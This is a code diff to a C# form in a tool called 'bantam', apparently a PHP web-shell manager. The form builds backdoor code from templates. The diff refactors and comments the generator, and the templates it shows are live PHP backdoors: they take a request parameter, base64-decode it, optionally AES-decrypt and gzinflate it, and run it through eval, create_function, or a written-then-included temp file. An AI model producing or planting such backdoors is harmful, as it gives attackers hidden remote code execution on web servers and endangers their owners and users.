@@ -72,7 +72,7 @@ namespace bantam.Forms
         }
 
         /// <summary>
-        /// 
+        /// GUI Button toggles
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -98,7 +98,7 @@ namespace bantam.Forms
         }
 
         /// <summary>
-        /// 
+        /// GUI button toggles
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -149,6 +149,20 @@ namespace bantam.Forms
             modifyShell.Show();
         }
 
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void btnAddShell_Click(object sender, EventArgs e)
+        {
+            ModifyShell modifyShell = new ModifyShell(txtBoxVarName.Text, comboBoxVarType.Text, chckbxGzipDecodeRequest.Checked,
+                                         checkBoxEncryptRequest.Checked, textBoxEncrpytionIV.Text, textBoxEncrpytionKey.Text,
+                                         textBoxIVVarName.Text, checkBoxSendIVInRequest.Checked, comboBoxRequestEncryptionType.Text);
+            modifyShell.Show();
+        }
+
         /// <summary>
         /// 
         /// </summary>
@@ -173,13 +187,14 @@ namespace bantam.Forms
                 if (encryptionKey.Length == CryptoHelper.KEY_Length) {
                     if (checkBoxSendIVInRequest.Checked) {
                         string encryptionIVVarName = textBoxIVVarName.Text;
+
                         if (!string.IsNullOrEmpty(encryptionIVVarName)) {
                             if (comboBoxRequestEncryptionType.Text == "openssl") {
                                 requestEncryptionStart = "@openssl_decrypt(";
                                 requestEncryptionEnd = ", 'AES-256-CBC', '" + encryptionKey + "', OPENSSL_RAW_DATA, $_" + requestMethod + "['" + encryptionIVVarName + "'])";
                             } else if (comboBoxRequestEncryptionType.Text == "mcrypt") {
                                 requestEncryptionStart = "rtrim(@mcrypt_decrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', ";
-                                requestEncryptionEnd = ", MCRYPT_MODE_CBC, $_" + requestMethod + "['" + encryptionIVVarName + "']), \"\0\")";
+                                requestEncryptionEnd = ", MCRYPT_MODE_CBC, $_" + requestMethod + "['" + encryptionIVVarName + "']), \"0\")";
                             }
                         }
                     } else {
@@ -205,7 +220,9 @@ namespace bantam.Forms
 
             switch (backdoorType) {
                 case BackdoorTypes.EVAL: {
-                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t@eval(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
+                        backdoorResult = "<?php \r\n" +
+                                         "if(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t" +
+                                         "@eval(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
                         break;
                     }
 
@@ -215,12 +232,21 @@ namespace bantam.Forms
                 //    }
 
                 case BackdoorTypes.CREATE_FUNCTION: {
-                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t$a=@create_function(null, " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t$a();\r\n}";
+                        backdoorResult = "<?php \r\n" +
+                                         "if(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t" +
+                                         "$a=@create_function(null, " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t" +
+                                         "$a();\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.TMP_INCLUDE: {
-                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '." + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
+                        backdoorResult = "<?php \r\n" +
+                                         "if(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t" +
+                                         "$fp = @tmpfile();\r\n\t" +
+                                         "$tmpf=@stream_get_meta_data($fp);\r\n\t" +
+                                         "$tmpf=$tmpf['uri'];\r\n\t" +
+                                         "@fwrite($fp, '<?php '." + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t" +
+                                         "@include($tmpf);\r\n\t@fclose($f);\r\n}";
                         break;
                     }
 
@@ -229,8 +255,9 @@ namespace bantam.Forms
                 //        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t@preg_replace(\"/.*/\x65\", " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "']" + requestEncryptionEnd + gzInflateEnd + "),'.');\r\n}";
                 //        break;
                 //    }
+
                 default:
-                    LogHelper.AddGlobalLog("Unknon backdoor type selection.", "GUI Error", LogHelper.LOG_LEVEL.ERROR);
+                    LogHelper.AddGlobalLog("Unknown backdoor type selection.", "GUI Error", LogHelper.LOG_LEVEL.ERROR);
                 break;
             }
 
@@ -240,6 +267,11 @@ namespace bantam.Forms
             return backdoorResult;
         }
 
+        /// <summary>
+        /// Action that all need to refresh the form
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
         {
             UpdateForm();
